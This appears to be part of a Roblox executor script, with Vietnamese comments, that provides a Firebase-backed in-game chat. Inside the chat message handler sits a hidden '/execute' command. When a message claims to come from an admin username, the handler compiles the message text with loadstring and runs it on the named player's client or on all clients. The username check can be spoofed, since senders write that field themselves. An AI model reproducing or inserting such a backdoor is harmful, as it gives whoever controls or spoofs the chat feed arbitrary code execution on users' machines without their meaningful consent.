---------------------------------------------------
-- RENDER CHAT & COMMAND SYSTEM
---------------------------------------------------
local function createText(msg)
    local prefix = getSenderPrefix(msg)
    return STab1:CreateParagraph(prefix, msg.message)
end

local function createImage(msg)
    local prefix = getSenderPrefix(msg)
    local p = STab1:CreateParagraph(prefix, "")
    local ok = pcall(function() p:CreateImage(msg.message) end)
    if not ok then p:SetText(msg.message) end
    return p
end

local function addMessage(key, msg)
    if seen[key] then return end
    seen[key] = true

    -- COMMAND SYSTEM
    if msg.message:match("^/execute") then
        if msg.username == ADMIN_USERNAME then
            local target, code = msg.message:match('^/execute%s+"(.-)"%s+(.+)')
            if target and code then
                if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then code = code:sub(2, -2) end
                if target == LocalPlayer.DisplayName or target == LocalPlayer.Name or target == "@" .. LocalPlayer.Name or target:lower() == "all" then
                    task.spawn(function()
                        local func, err = loadstring(code)
                        if func then pcall(func) else warn("Lỗi loadstring do sai cú pháp: ", err) end
                    end)
                    Window:SendNotification("Hệ Thống", "Đang thực thi lệnh từ Admin!", 3)
                end
            end
        end
    end

    local obj = isImage(msg.message) and createImage(msg) or createText(msg)
    table.insert(messageObjects, obj)

    if #messageObjects > MAX_UI_MESSAGES then
        local oldestObj = table.remove(messageObjects, 1)
        pcall(function() if oldestObj and oldestObj.Destroy then oldestObj:Destroy() end end)
    end
end

---------------------------------------------------
-- THAO TÁC CƠ BẢN
---------------------------------------------------
local function clearChat()
    for _, v in ipairs(messageObjects) do
        pcall(function() if v and v.Destroy then v:Destroy() end end)
    end
    messageObjects = {}
    startTime = os.time()
end

local function sendMessage(text)
    text = tostring(text or "")
    if text == "" then return end
    if tick() - lastSend < COOLDOWN then return end
    
    lastSend = tick()
    updateCooldown()

    local payload = {
        displayName = LocalPlayer.DisplayName,
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        message = text,
        timestamp = os.time()
    }

    http_request({
        Url = FIREBASE_URL .. PATH_MESSAGES,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function sendImage(id)
    id = tostring(id or "")
    local valid = id:lower():match("^rbxassetid://%d+$") or id:lower():match("^https?://.+")
    if not valid then return end
    if tick() - lastSend < COOLDOWN then return end
    
    lastSend = tick()
    updateCooldown()

    local payload = {
        displayName = LocalPlayer.DisplayName,
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        message = id,
        timestamp = os.time()
    }

    http_request({
        Url = FIREBASE_URL .. PATH_MESSAGES,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function fetch()
    local fetchUrl = FIREBASE_URL .. PATH_MESSAGES .. '?orderBy="$key"&limitToLast=20'
    local res = http_request({Url = fetchUrl, Method = "GET"})

    if not res or res.StatusCode ~= 200 then return end

    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok or type(data) ~= "table" then return end

    local newMessages = {}
    for k, v in pairs(data) do
        if type(v) == "table" and v.timestamp and v.timestamp >= startTime then
            table.insert(newMessages, {key = k, msg = v})
        end
    end

    table.sort(newMessages, function(a, b) return a.msg.timestamp < b.msg.timestamp end)

    for _, item in ipairs(newMessages) do
        addMessage(item.key, item.msg)
    end
end

